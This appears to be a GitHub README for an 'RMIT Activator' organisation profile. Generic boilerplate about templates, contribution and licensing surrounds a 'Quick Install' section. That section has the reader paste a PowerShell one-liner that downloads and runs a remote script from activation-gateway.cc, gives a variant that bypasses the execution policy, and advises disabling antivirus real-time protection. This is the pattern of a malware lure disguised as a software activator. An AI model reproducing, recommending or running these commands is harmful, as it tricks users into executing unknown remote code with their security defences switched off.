<div align="center">

# RMIT Activator Profile Repository — Config

![](files/1.jpg)

[![state](https://img.shields.io/badge/STATE-STABLE-2ea44f?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-7%2B-2f81f7?style=flat-square&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/LANG-PYTHON-54aeff?style=flat-square&labelColor=0d1117)]()

</div>

---

This repo is the organizational profile for RMIT Activator, not a dumping ground for boilerplate. Keep every file minimal, intentional, and aligned with the profile's purpose. If a change doesn't make the profile clearer or more useful, it doesn't belong here.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Execute the setup script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Key Focus Areas

- **Default community health files.** One canonical source for issue templates, pull request templates, contributing guidance, and support resources so every repository inherits consistent standards without duplication.

- **Profile repository.** The organization profile and foundational documentation live here and are the first thing visitors read. Treat them as product copy, not an afterthought.

- **Templates that ship.** Community health files are only useful if they are current, minimal, and enforceable. Prune stale templates aggressively; a bloated template set gets ignored.

- **Consistency over customization.** Prefer org-wide defaults. Per-repository overrides create drift and maintenance debt — require a clear reason before diverging.

- **Low-friction contribution.** Clear naming, predictable structure, and short files. If a contributor has to guess where something belongs, the layout is wrong.

- **Documentation as infrastructure.** Docs changes are reviewed with the same rigor as code. Broken links, stale guidance, and outdated policy are defects.

## Community & Discussions

Discussions are the default channel for questions, proposals, and configuration debates. Open an issue only when you have a reproducible bug; everything else belongs in Discussions. Search before posting — duplicate threads get closed. When you find an answer that works, mark it. That is the whole contribution model.

## 📸 Screenshot

![](files/2.jpg)

![](files/3.jpg)

## Links

- **Discussions** — where questions, proposals, and community feedback belong.
- **Issue tracker** — for concrete problems and work items; keep it focused.
- **Contribution workflow** — open an account, branch, and submit changes; no drive-by edits.
- **Known limitations** — GitHub renders the README; treat quirks as documented behavior.
- **License** — see the License section; contributions are accepted under its terms.

## License

This repository ships under the MIT license. Use it, fork it, adapt it — commercially or not — as long as the copyright notice and permission notice travel with it. No warranty, no liability; you break it, you own it.

Contributions land under the same terms. Open a pull request and you're agreeing to license your work this way.